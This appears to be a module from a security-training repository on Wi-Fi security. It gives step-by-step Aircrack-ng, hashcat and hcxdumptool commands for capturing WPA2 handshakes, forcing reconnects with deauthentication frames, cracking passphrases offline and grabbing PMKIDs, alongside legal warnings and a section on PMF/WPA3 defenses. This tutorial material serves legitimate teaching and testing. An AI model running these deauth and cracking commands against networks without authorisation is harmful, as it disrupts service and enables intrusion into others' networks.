# 04: Wireless Security & the Aircrack-ng Suite `[Level 2: Wireless Exploitation]`

Wi-Fi security is a physics-meets-cryptography problem: frames travel through the
air where anyone with the right radio can hear them, so the protection is
entirely cryptographic. This module explains how 802.11 works at the frame
level, walks the full WPA/WPA2 handshake-capture-and-crack workflow with the
Aircrack-ng suite, and then covers the modern defenses (PMF, WPA3) that break
that workflow.

> **This is the most legally sensitive module in the repo.** Capturing,
> deauthenticating, or cracking any network you do not own is a crime in most
> jurisdictions, and monitor-mode transmission can violate radio regulations.
> **Use only your own AP and your own client device, in an RF-isolated space.**
> Nothing here targets the Docker lab, wireless requires real radios.

---

## 1. 802.11 frames & the two interface modes (architecture)

802.11 (Wi-Fi) traffic is carried in three frame classes:

| Frame type | Examples | Why the attacker cares |
|------------|----------|------------------------|
| **Management** | Beacon, Probe req/resp, Auth, Assoc, **Deauth** | Unencrypted in WPA2; deauth frames are the lever for forced re-handshakes |
| **Control** | RTS/CTS, ACK | Medium access; rarely attacked directly |
| **Data** | The actual payload | Encrypted under WPA/WPA2/WPA3 |

Two key identifiers:
- **BSSID**: the AP's MAC address (identifies the access point).
- **ESSID**: the human-readable network name ("HomeWiFi").
- **Channel**: the frequency the AP uses; you must listen on the *right* one.

### Managed vs Monitor mode

- **Managed mode**: normal operation: the card associates with one AP and only
  hands your OS frames addressed to it. You cannot see other traffic.
- **Monitor mode (RFMON)**: the radio passively captures *all* 802.11 frames in
  range on a channel, regardless of destination, and exposes management/control
  frames. This is what makes handshake capture possible, and it requires a
  chipset + driver that support it (see `hardware-and-setup.md`).

---

## 2. The WPA2 4-way handshake (the crypto you're attacking)

WPA2-PSK never sends your password over the air. Instead:

1. The passphrase + ESSID are stretched (PBKDF2, 4096 iterations) into the
   **PMK** (Pairwise Master Key).
2. When a client joins, the AP and client run a **4-way EAPOL handshake** that
   uses nonces and MACs to derive a fresh session key (**PTK**) and *prove* both
   sides know the PMK, **without transmitting it**.

```text
AP  --- (1) ANonce ---------------------->  Client   derives PTK
AP  <-- (2) SNonce + MIC -----------------  Client
AP  --- (3) install key + MIC ----------->  Client
AP  <-- (4) ACK --------------------------  Client   handshake complete
```

The attack: **capture those four EAPOL messages**, then *offline* guess
passphrases, for each candidate, recompute the PMK→PTK→MIC and check whether it
matches the captured MIC. No further contact with the AP is needed once you have
the handshake. This is why a strong, high-entropy passphrase is the only real
defense against WPA2 cracking: the math is only as hard as guessing the password.

**You are not breaking AES.** You are brute-forcing the human-chosen passphrase.

---

## 3. Step 1: Prepare the interface (monitor mode)

```bash
# [Level 1: Intermediate] See your wireless interfaces
iw dev                          # lists wlan0, etc. + current mode/channel
airmon-ng                       # aircrack-ng's view of wireless cards

# [Level 1: Intermediate] Kill processes that fight for the radio
sudo airmon-ng check            # shows NetworkManager/wpa_supplicant etc.
sudo airmon-ng check kill       # stop them so they don't yank you off-channel

# [Level 1: Intermediate] Enable monitor mode (creates wlan0mon)
sudo airmon-ng start wlan0
iw dev                          # confirm: type 'monitor'

# ...when finished, restore normal networking:
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

Expected after `start wlan0`:

```text
PHY   Interface   Driver     Chipset
phy0  wlan0       ath9k_htc  Atheros AR9271
      (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
      (mac80211 station mode vif disabled for [phy0]wlan0)
```

> If `airmon-ng start` doesn't produce a `...mon` interface, your chipset/driver
> doesn't support monitor mode, see `hardware-and-setup.md`.

---

## 4. Step 2: Discover targets with `airodump-ng`

```bash
# [Level 1: Intermediate] Survey ALL nearby APs and clients (both bands)
sudo airodump-ng wlan0mon
sudo airodump-ng --band abg wlan0mon      # scan 2.4 + 5 GHz

# Read the display, note YOUR OWN network's BSSID, CHANNEL, and a connected
# client (STATION). Ctrl-C to stop the survey.
```

`airodump-ng` display, annotated:

```text
 BSSID              PWR  Beacons  #Data  CH  ENC  CIPHER AUTH ESSID
 AA:BB:CC:11:22:33  -42     120     540   6  WPA2 CCMP   PSK  MyLabAP   <- your AP
                                                                        (note CH 6)
 STATION            PWR   Rate    Lost   Frames  Probe
 AA:BB:CC:11:22:33  DE:AD:BE:EF:00:01  -50  0-1  0  312           <- a client on it
```

```bash
# [Level 2+: Advanced / Field Ops] Lock onto YOUR AP's channel + BSSID and
# write a capture file. -w sets the output prefix; --bssid/-c narrow the focus.
sudo airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w handshake wlan0mon
# Leave this running. It will write handshake-01.cap, and show:
#   [ WPA handshake: AA:BB:CC:11:22:33 ]   <- top-right, once you capture one.
```

---

## 5. Step 3: Force a handshake with `aireplay-ng` (deauth)

To capture the 4-way handshake you need a client to (re)join. Rather than wait,
you can send **deauthentication** management frames that kick a client off; it
immediately reconnects and re-runs the handshake, which your `airodump-ng`
window records.

```bash
# [Level 2+: Advanced / Field Ops] In a SECOND terminal, while airodump-ng runs:

# Deauth a SPECIFIC client (most reliable, least disruptive), 10 bursts
sudo aireplay-ng --deauth 10 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:00:01 wlan0mon
#                          │       │  target AP BSSID   │  target CLIENT MAC
#                          └ number of deauth bursts (0 = continuous)

# Broadcast deauth (hits all clients; noisier, sometimes needed)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:11:22:33 wlan0mon
```

Watch the `airodump-ng` window: within a few seconds of the client reconnecting
you should see **`WPA handshake: AA:BB:CC:11:22:33`** appear. That means
`handshake-01.cap` now contains all four EAPOL frames.

```bash
# [Level 1: Intermediate] Verify the capture actually holds a valid handshake
sudo aircrack-ng handshake-01.cap
# -> "1 handshake" and your ESSID listed = good to crack.
```

> **Legal reminder:** deauthentication actively disrupts a network. It is only
> lawful against equipment you own or are authorized to test. Continuous deauth
> (`--deauth 0`) is a denial-of-service.

---

## 6. Step 4: Offline cracking with `aircrack-ng`

With a valid handshake captured, cracking is a purely offline, target-free
dictionary attack.

```bash
# [Level 2+: Advanced / Field Ops] Dictionary attack against the handshake
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt \
                 -b AA:BB:CC:11:22:33 handshake-01.cap
#   -w wordlist   -b target BSSID   <capture file>

# rockyou.txt ships gzipped on Kali; expand it once:
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
```

Expected on success:

```text
                 Aircrack-ng 1.7

      [00:00:12] 8452/14344391 keys tested (712.34 k/s)

      KEY FOUND! [ SummerBreeze2019 ]

      Master Key     : CD 69 0D ...
      Transient Key  : 12 AF ...
      EAPOL HMAC     : 5B 8C ...
```

### Faster / modern cracking with hashcat

`aircrack-ng` CPU-cracks; for real speed, convert the capture and use GPU
hashcat with the modern `22000` mode:

```bash
# [Level 2+: Advanced / Field Ops] Convert .cap -> hashcat 22000 format
hcxpcapngtool -o handshake.22000 handshake-01.cap

# GPU dictionary attack (mode 22000 = WPA-PBKDF2-PMKID+EAPOL)
hashcat -m 22000 handshake.22000 /usr/share/wordlists/rockyou.txt

# Add rules to mutate the wordlist (l33t-speak, appended digits, etc.)
hashcat -m 22000 handshake.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### PMKID attack (clientless, when supported)

Some APs leak a **PMKID** in the first EAPOL frame, no client and no deauth
required:

```bash
# [Level 2+: Advanced / Field Ops] Capture PMKID directly
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.22000 pmkid.pcapng
hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt
```

---

## 7. Modern defense: why this attack is dying

The whole workflow above depends on two weaknesses that modern Wi-Fi closes:

### Protected Management Frames (802.11w / PMF)

WPA2's management frames (including **deauth**) are unauthenticated, which is why
`aireplay-ng` can forge them. **PMF (802.11w)** cryptographically protects
management frames so forged deauths are rejected, the client stays connected
and you can't force a re-handshake. PMF is *optional* in WPA2 but **mandatory**
in WPA3.

### WPA3 & SAE (Simultaneous Authentication of Equals / "Dragonfly")

WPA3-Personal replaces the PSK handshake with **SAE**, a password-authenticated
key exchange with two decisive properties:

- **No offline dictionary attack.** Even with a full capture, you cannot test
  passphrase guesses offline, each guess requires a fresh, interactive
  handshake with the AP, which is rate-limited and detectable.
- **Forward secrecy.** Compromising the passphrase later does not decrypt past
  traffic.

The practical upshot: the capture→deauth→dictionary chain that defines this
module simply **does not work against a correctly configured WPA3-SAE + PMF
network.** (WPA3 has had implementation bugs, e.g. the "Dragonblood" side
channels, but the protocol design defeats the classic aircrack workflow.)

### Defender checklist

- Deploy **WPA3-SAE**; where WPA2 is required for legacy clients, run
  **WPA3/WPA2 transition mode** and **enable PMF (802.11w) as required**.
- Use a **long, random passphrase** (≥ 16 chars, not in any wordlist): the only
  thing standing between a captured WPA2 handshake and your network.
- **Disable WPS** (PIN brute-force / Pixie-Dust bypass the passphrase entirely).
- Monitor for **deauth floods** and rogue APs with a WIDS.
- Segment guest/IoT SSIDs; don't reuse the corporate passphrase.

---

## Common troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| No `wlan0mon` after `airmon-ng start` | Chipset/driver lacks monitor mode | Use AR9271/RTL8812AU; install the right driver |
| Card keeps changing channels | NetworkManager still running | `sudo airmon-ng check kill` |
| Never see "WPA handshake" | Wrong channel, no client, too weak signal, or PMF | Lock `-c <chan>`, target a real client, get closer; PMF blocks deauth |
| `aireplay-ng` "no such BSSID / not associated" | Not on the AP's channel | Set airodump-ng to the exact `-c` channel first |
| Deauth sent but client won't drop | PMF (802.11w) enabled | Attack won't work: that's the defense doing its job |
| `aircrack-ng` "no valid handshake" | Incomplete EAPOL capture | Re-capture; you need all 4 messages |
| Cracking finds nothing | Passphrase not in wordlist | Bigger/targeted wordlist + hashcat rules, or it's genuinely strong |
| VM sees no wireless card | USB passthrough not configured | See `hardware-and-setup.md` |

---

 Adapter chipsets, driver compilation, and VM USB passthrough are covered in
**[hardware-and-setup.md](hardware-and-setup.md)**.
